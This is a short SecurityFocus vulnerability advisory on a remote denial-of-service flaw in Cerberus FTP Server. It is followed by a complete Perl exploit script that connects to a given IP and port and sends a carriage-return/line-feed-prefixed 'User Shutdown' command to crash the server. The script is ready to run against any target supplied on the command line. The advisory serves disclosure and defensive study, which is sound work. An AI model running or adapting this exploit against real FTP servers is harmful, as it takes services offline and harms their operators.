source: http://www.securityfocus.com/bid/8452/info

It has been reported that some versions of Cerberus FTP Server may be prone to remote denial of service attacks. The problem is said to occur when the order of a carriage return and line feed are prefixed to a specific command, rather then appended. When this data is interpreted by the FTP server, the application supposedly crashes. The precise technical details regarding where the issue lies and why it occurs are currently unknown. This BID will be updated as further information becomes available. 

  print "Exploit for FTP-Server\n";
  print "   by The real Remoter\n";
  my $usage = "\nftpcrash <IP> <Port>\n";
  die "$usage" unless $ARGV[0] && $ARGV[1];
  use Socket;
  my $remote = $ARGV[0];
  my $port = $ARGV[1];
  my $iaddr = inet_aton($remote);
  my $proto = getprotobyname("tcp");
  my $paddr = sockaddr_in($port, $iaddr);
  socket(SOCK, PF_INET, SOCK_STREAM, $proto);
  connect(SOCK, $paddr) or die "Can't connect to " . $remote;
  print "Sending exploit\n";
  $msg = "\x0d\x0a";
  $msg = $msg . "User Shutdown";
  send(SOCK,$msg, 0) or die "Can't send Exploit";
  sleep(1);
  print "Server Crashed!";
  sleep(1);
  exit;

